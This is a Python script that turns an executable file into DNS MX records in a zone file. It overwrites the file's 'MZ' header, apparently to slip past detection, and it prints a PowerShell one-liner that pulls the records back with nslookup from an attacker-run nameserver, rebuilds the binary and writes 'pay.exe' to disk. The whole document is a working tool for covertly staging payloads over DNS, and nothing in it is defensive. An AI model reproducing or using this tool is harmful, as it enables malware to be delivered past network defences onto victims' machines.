#!/usr/bin/python3

import sys
import os
import shutil
from datetime import datetime

def chunkstring(string, length):
    return (string[0+i:length+i] for i in range(0, len(string), length))


if len(sys.argv) != 4: #print help if no arguments given
	print("""\nGenerates a DNS zonefile containing MX records which serve  executable file in hex form.
Usage: python3 """ + os.path.basename(__file__) + """ <domain to query> <nameserver for domain> 
	
<domain to query>: The domain nslookup will run against
<nameserver for domain>: The nameserver that serves <domain to query>
	
Example: python3 """ + os.path.basename(__file__) + """ my.domain.com ns1.mydomain.com""")
	sys.exit(0)

#Generate serial for SOA by getting YYYYMMDDHH
serial = datetime.today().strftime('%Y%m%d%H') 

#domain for zonefile from args
origin = sys.argv[2]
#nameserver value from args
ns_soa = sys.argv[3]

try:
	shutil.copy(sys.argv[1], "./modified.exe")
except:
	sys.exit("Unable to read payload!")
#open executable and read binary
try:
	with open("modified.exe", "rb+") as f:
		f.seek(0)
		f.write(b'\xFF')
		f.seek(1)
		f.write(b'\xFE')
		f.close
except:
	sys.exit("Unable to change magic header!")

file = open("modified.exe", "rb")
byte = file.read()

file_size = os.path.getsize("modified.exe")
#format binary into hex format
data = ''.join('{:02x}'.format(x) for x in byte)

#open output file for records
zonefile = open(origin, "w")

#first part of zonefile containing SOA and NS record
contents = """$ORIGIN """ + origin + """.
@                      3600 SOA   """ + ns_soa + """. (
                              zone-admin.""" + origin + """.     ; address of responsible party
                              """ + serial + """                 ; serial number 
                              60                        ; refresh period
                              600                        ; retry period
                              604800                     ; expire time
                              1800                     ) ; minimum ttl
                      86400 NS    """ + ns_soa + """.
"""
zonefile.write(contents)
#i is subdomain, j is MX preference value.
i = 1
j = 10
#split data into 200 character long chunks
for chunk in chunkstring(data, 200):
	#if j is 1010 we have written 100 records for this subdomain and we want to start fresh with a new subdomain
	if j == 1010:
		i = i + 1
		j = 10
	else:
		pass
	#create record with 50 char per octect
	temp = chunk[:50] + "." + chunk[50:100] + "." + chunk[100:150] + "." + chunk[150:200]
	#write the full record.  Strip "..." and ".." to account for our very last record which won't fill up all 200 char and can break the record.
	zonefile.write(str(i) + "                         60 MX " + str(j) + "   " + temp.replace(" ","").replace("...",".").replace("..",".").strip("\n") + "\n")
	j = j + 10

zonefile.close()

cmd = "$o=\"\";for($a = 1; $a -le " + str(i) + "; $a ++){$b = nslookup -type=MX \"$a." + origin + "\" 2> $null;$c = @($null)*($b.count - 3);for($i = 3; $i -le $b.count - 1; $i++){$d = ($b[$i] | sls -patt '(?<=\=\s)((\d|\w){1,50}\.?){1,4}' -a).matches.Value;$c[$d[0]/10 - 1] = $d[1].replace(\".\",\"\")};$c.foreach({$o = $o + $_})};[byte[]]$e = ($o -split '(.{2})' -ne '' -replace '^', '0X');$f = \".\\a.txt\";$e | sc -en byte $f;[byte[]]$g = gc $f -en byte -raw;$g[0x00] = 0x4D;$g[0x01] = 0x5A;$g | sc .\pay.exe -enc byte;ri $f"


print("\nProduced " + origin + "! Serve this zonefile on your DNS server on " + ns_soa + "!")

print("\nPowershell cmd: \n\n" + cmd)

print("\nExpected file size: " + str(file_size) + "\n")
